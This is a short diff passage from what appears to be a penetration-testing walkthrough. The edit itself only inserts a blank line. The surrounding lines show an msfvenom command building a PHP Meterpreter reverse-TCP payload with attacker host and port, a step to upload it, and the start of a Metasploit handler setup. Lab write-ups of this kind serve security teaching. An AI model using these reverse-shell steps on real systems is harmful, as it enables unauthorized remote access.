@@ -63,6 +63,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.84.55 LPORT=6666 -f raw -or
 
 - Upload a reverse php connection payload.
 <img src="images/red-16.png" />
+
 ```
 msf > use multi/handler
 msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
